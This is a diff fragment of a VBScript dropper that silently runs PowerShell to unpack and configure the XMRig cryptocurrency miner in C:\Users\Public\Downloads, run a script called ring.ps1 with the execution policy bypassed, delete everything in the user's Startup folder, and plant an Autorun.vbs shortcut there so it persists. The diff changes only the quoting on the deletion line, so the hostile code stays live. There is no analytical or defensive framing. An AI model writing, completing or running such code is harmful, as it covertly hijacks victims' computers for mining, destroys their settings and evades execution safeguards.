@@ -24,7 +24,7 @@ objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\
 objShell.Run "powershell.exe -Command Copy-Item -Path C:\Users\Public\Downloads\config.json -Destination C:\Users\Public\Downloads\xmrig-6.22.2\config.json -Force", 0, True
 objShell.Run "powershell.exe -Command & 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\Users\Public\Downloads\xmrig-6.22.2-gcc-win64.zip' 'C:\Users\Public\Downloads\'", 0, True
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\Downloads\ring.ps1", 0, True
-objShell.Run "powershell.exe -Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force", 0, True
+objShell.Run "powershell.exe -Remove-Item -Path '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*' -Force", 0, True
 objShell.Run "powershell.exe -$source = 'C:\Users\Public\Downloads\Autorun.vbs'", 0, True
 objShell.Run "powershell.exe -$destination = '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk'", 0, True
 objShell.Run "powershell.exe -$WshShell = New-Object -ComObject WScript.Shell", 0, True
